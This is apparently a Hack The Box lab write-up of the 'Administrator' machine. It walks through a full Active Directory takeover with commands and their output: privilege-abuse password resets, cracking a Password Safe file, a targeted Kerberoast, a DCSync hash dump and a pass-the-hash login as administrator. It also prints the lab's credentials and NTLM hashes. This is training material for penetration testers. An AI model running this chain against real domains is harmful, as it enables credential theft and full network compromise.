## 2026-07-18
---

Difficulty: Medium

# User Flag
### Information Gathering - Initial Credentials

As part of an assumed breach scenario, initial credentials were provided from HackTheBox.
Username: `Olivia` Password: `ichliebedich`

### Information Gathering - Gathering through the Services
#### Service Enumeration

The services are now enumerated using NMAP.
```
sudo nmap 10.129.35.85 -sC -sV
```

Here are the available services found on the system.
```
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-18 13:45:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The required name to the `/etc/hosts` is added.
```
10.129.35.85	administrator.htb
```

We will now proceed to check under which services those credentials are valid.

For FTP:
```
netexec ftp administrator.htb -u 'Olivia' -p 'ichliebedich'
```

```
FTP         10.129.35.85    21     administrator.htb [-] Olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)
```
Inaccessible.

For SMB:
```bash
netexec smb administrator.htb -u 'Olivia' -p 'ichliebedich'
```

```
SMB         10.129.35.85    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.35.85    445    DC               [+] administrator.htb\Olivia:ichliebedich
```

For LDAP:
```
netexec ldap administrator.htb -u 'Olivia' -p 'ichliebedich'
```

```
LDAP        10.129.35.85    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.35.85    389    DC               [+] administrator.htb\Olivia:ichliebedich
```

And for WinRM:
```
netexec winrm administrator.htb -u 'Olivia' -p 'ichliebedich'
```

```
WINRM       10.129.35.85    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.35.85    5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```

While FTP did not worked with the credentials, the SMB, RPC and WinRM were directly accessible through the credentials.

#### Initial Access - Olivia vulnerable to GenericAll Privileges

Since WinRM remain the most interesting service out of them, login is proceeded.
```
evil-winrm -i administrator.htb -u 'Olivia' -p 'ichliebedich'
```

However, it did not work.
Bloodhound enumeration is performed instead.
```
bloodhound-python -u Olivia -p ichliebedich -ns 10.129.35.85 -d administrator.htb -c All --zip
```

After analyzing through Bloodhound, user `olivia` is vulnerable to the `GenericAll` Privileges to `michael`. Then, `benjamin` can also be exploited through this user with the `ForceChangePassword` privilege.

![[Screenshot 2026-07-18 at 17.38.02.png]]

So, from the WinRM session, import PowerView.
```
upload PowerView.ps1
Import-Module .\PowerView.ps1
```

Then, this privilege will be exploited by changing `michael` user's password.
```
$SecPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR\Olivia', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
```

Now, we can validate that this user has its password changed and have WinRM Access.
```
netexec winrm administrator.htb -u 'michael' -p 'Password123!'
```

```
WINRM       10.129.35.85    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.35.85    5985   DC               [+] administrator.htb\michael:Password123! (Pwn3d!)
```

And then, from `michael`, the user `benjamin` is vulnerable to the `ForceChangePassword` privilege.

The password is changed again, just like for `michael`.
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR\michael', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword -Credential $Cred
```

While this user does not have access to the WinRM service, it has however access to the FTP Shares.
```
netexec ftp administrator.htb -u 'benjamin' -p 'Password123!'
```

```
FTP         10.129.35.85    21     administrator.htb [+] benjamin:Password123!
```

FTP through `benjamin` is attempted.
```
ftp administrator.htb
benjamin
Password123!
```

The file `Backup.psafe3` that we found in the share is downloaded.
```
dir
type binary
get Backup.psafe3
exit
```

Now, the file will be open.
```
pwsafe Backup.psafe3
```

#### Initial Access - Weak Password Storage

The password which we do not have will be required. However, `john` allows the bruteforcing of the password through its hash.
```
pwsafe2john Backup.psafe3 > hash.txt
```

Here is the hash we just obtained.
```
cat hash.txt
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

Cracking via John is attempted.
```
john hash.txt --wordlist=rockyou.txt
```

The resulting password is `tekieromucho`.

Now successfully logged in through the pwsafe interface.
During post-exploitation, three sets of credentials were recovered. Validation testing confirmed one set provided active access to the environment.

Valid credentials has been obtained:
`emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

The user flag for the user `emily` has been obtained.

![[Screenshot 2026-07-18 at 17.56.57.png]]

# Root Flag
#### Privilege Escalation - Vulnerability to GenericWrite

Now, the user `ethan` is vulnerable to the `GenericWrite` Privileges from `emily`, making this account vulnerable to targeted Kerberoast attacks.

![[Screenshot 2026-07-18 at 18.03.28.png]]

Kerberos attack is attempted.
```
python targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

The hash of the user `ethan` has been received. It will be cracked it using hashcat.
```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$a476af72dad2fad5d8eff45628f7f1c3$f7028962297a456e0efaa31a320427833eebd7a7f9ddad7cd4add90c337f945be4182fc8da31cf5d6917fb175fd7cd5ffc8bac0c24ab8b33070b899471e07<SNIP>
```

The hash will be now cracked.
```
hashcat -m 13100 hash.txt rockyou.txt
```

The password is `limpbizkit`

And from the user `ethan`, the hashes of all users through `impacket-secretsdump` can be returned due to the `GetChangesAll` privilege.

![[Screenshot 2026-07-18 at 18.03.12.png]]

The hashes can be returned with this command.
```
impacket-secretsdump ethan:limpbizkit@administrator.htb
```

The hashes have been successfully returned.
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

Now, login through the `administrator` account through the pass-to-hash is attempted.
```
evil-winrm -i administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

The `administrator` root flag has been now obtained.
![[Screenshot 2026-07-18 at 21.36.25.png]]